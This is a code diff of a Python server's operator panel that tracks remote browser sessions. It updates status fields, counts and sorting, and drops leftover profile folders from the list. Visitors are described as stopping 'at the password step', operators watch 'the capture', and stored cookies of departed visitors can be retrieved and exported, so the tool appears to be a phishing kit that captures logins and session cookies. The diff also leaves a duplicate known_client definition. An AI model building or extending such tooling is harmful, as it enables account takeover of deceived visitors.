@@ -256,21 +256,33 @@ def stage_of(session) -> str:
 
 
 def client_row(session, store: Store) -> dict:
-    """What the panel shows of one session."""
+    """What the panel shows of one session.
+
+    "Active" means the browser is open and there is somebody in it. A
+    session whose browser has been closed is not active, however recently
+    it was here - and one that is being worked in is more active than one
+    that has been left alone at the password step.
+    """
     idle = max(0.0, time.monotonic() - session.seen)
     browser = session.hub.browser or {}
+    browser_open = bool(session.state.get("browser_open"))
+    viewers = len(session.hub.viewers)
     return {
         "id": session.id,
-        "status": ("active" if session.state.get("browser_open")
+        "status": ("active" if browser_open
                    else session.state.get("status", "idle")),
         "stage": stage_of(session),
         "page": session.hub.page,
         "step": session.state.get("step", ""),
         "error": session.state.get("error", ""),
-        "browser_open": bool(session.state.get("browser_open")),
+        "browser_open": browser_open,
         "browser_url": browser.get("url", ""),
         "browser_title": browser.get("title", ""),
-        "viewers": len(session.hub.viewers),
+        "viewers": viewers,
+        # Somebody is looking at the capture right now. This is what tells
+        # the panel that a person is here, as opposed to a session that is
+        # only still remembered.
+        "here": viewers > 0,
         "waiting": bool(session.waiting),
         "finished": bool(session.hub.finished),
         "idle_seconds": round(idle, 1),
@@ -291,16 +303,17 @@ def gone_row(sid: str, record: dict, store: Store) -> dict:
     idle = max(0.0, time.time() - seen) if isinstance(seen, (int, float)) else 0.0
     return {
         "id": sid,
-        "status": "gone" if record else "never",
-        "stage": record.get("stage", "—") if record else "Never seen",
+        "status": "gone",
+        "stage": record.get("stage", "—") if record else "Unknown",
         "page": record.get("page", ""),
         "step": "",
         "error": "",
         "browser_open": False,
         "browser_url": record.get("url", "") if record else "",
-        "browser_title": "",
+        "browser_title": record.get("title", "") if record else "",
         "viewers": 0,
         "waiting": False,
+        "here": False,
         "finished": bool(record.get("finished")) if record else False,
         "idle_seconds": round(idle, 1),
         "export_allowed": store.export_allowed(sid),
@@ -312,10 +325,11 @@ def gone_row(sid: str, record: dict, store: Store) -> dict:
 def every_client(store: Store) -> list[dict]:
     """Every client the server knows about.
 
-    The ones that are here now, the ones that have gone since the server
-    started, and the ones whose browser profile is on disk from an earlier
-    run - a visitor is a visitor, and the panel says which of them are
-    here and which are not.
+    The ones that are here now, and the ones that have gone since the
+    server started. That is all: a client is somebody who connected, not a
+    folder on disk. A profile left behind by a run of the server from last
+    week is not a client - nobody is in it, nobody has been for days, and
+    listing it would put rows in the panel that nothing can be done about.
     """
     server = _server()
     rows = [client_row(session, store) for session in server.SESSIONS.values()]
@@ -326,20 +340,11 @@ def every_client(store: Store) -> list[dict]:
             rows.append(gone_row(sid, record, store))
             seen.add(sid)
 
-    # The profiles on disk: every visitor whose browser has ever been
-    # opened here, even in an earlier run of the server.
-    try:
-        profiles = server.PROFILES
-        for folder in sorted(profiles.iterdir()):
-            if not folder.is_dir():
-                continue
-            if folder.name not in seen:
-                rows.append(gone_row(folder.name, {}, store))
-                seen.add(folder.name)
-    except Exception:
-        pass
-
-    rows.sort(key=lambda row: (row["known"] is False, row["idle_seconds"]))
+    # The ones who are here come first, and among them the ones who are
+    # working come before the ones who are not.
+    rows.sort(key=lambda row: (row["known"] is False,
+                                not row["browser_open"],
+                                row["idle_seconds"]))
     return rows
 
 
@@ -429,10 +434,14 @@ def build_router() -> APIRouter:
             "clients": rows,
             "events": events(),
             "counts": {
+                # Everybody the server knows about, here or gone.
                 "total": len(rows),
+                # Somebody is looking at the capture right now.
+                "here": sum(1 for row in rows if row["here"]),
+                # Their browser is open, whether or not they are watching.
                 "active": sum(1 for row in rows if row["browser_open"]),
-                "idle": sum(1 for row in rows
-                            if row["status"] in ("idle", "gone", "never")),
+                # They have gone: the browser was closed and they left.
+                "gone": sum(1 for row in rows if not row["known"]),
                 "viewers": sum(row["viewers"] for row in rows),
                 "finished": sum(1 for row in rows if row["finished"]),
                 "errors": sum(1 for row in rows if row["status"] == "error"),
@@ -592,6 +601,17 @@ async def cookies_of(sid: str) -> list[dict]:
     record = getattr(server, "GONE", {}).get(sid) or {}
     cookies = record.get("cookies")
     return cookies if isinstance(cookies, list) else []
+
+
+def known_client(sid: str) -> bool:
+    """Is this a client the server knows about, here or gone?
+
+    Only a client that really was here: a session, or a record of one
+    that has gone. A profile folder left on disk by an earlier run is
+    not a client, and nothing can be done with it.
+    """
+    server = _server()
+    return sid in server.SESSIONS or sid in getattr(server, "GONE", {})
 
 
 def known_client(sid: str) -> bool:
